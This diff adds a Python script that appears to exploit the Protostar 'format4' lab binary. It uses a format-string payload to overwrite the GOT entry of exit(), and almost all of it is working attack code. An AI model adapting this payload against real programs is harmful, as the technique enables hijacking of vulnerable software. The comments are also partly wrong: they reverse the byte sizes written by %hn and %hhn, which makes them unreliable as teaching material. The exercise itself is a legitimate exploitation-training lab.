@@ -1,0 +1,32 @@
+#!/usr/bin/python
+
+# root@protostar:/opt/protostar/bin# objdump -TR format4 | grep exit
+#   00000000      DF *UND*	00000000  GLIBC_2.0   _exit
+#   00000000      DF *UND*	00000000  GLIBC_2.0   exit
+#   08049718 R_386_JUMP_SLOT   _exit
+#   08049724 R_386_JUMP_SLOT   exit
+
+# so we need to redirect to the GOT of exit()
+
+
+# addresses of adjacent bytes, writing 2 at a time (got, got2 below)
+# due to the $hhn writing to that location from format
+# the values are incremented with the %NUMx from the input
+
+# short-write values to GOT: (hex)
+# the amounts specified by the %NUMx
+
+# hn  -> is a pointer to a short int   - 1 byte
+# hhn -> is a pointer to a signed char -> short write 2 bytes
+
+
+
+
+
+hello = "\xb4\x84\x04\x08" # don't need this because got overwrite
+got   = "\x24\x97\x04\x08"  
+got2  = "\x25\x97\x04\x08"
+
+payload = got + got2 + "%124x" + "%5$hhn" + "%48x" + "%4$hhn"
+
+print payload
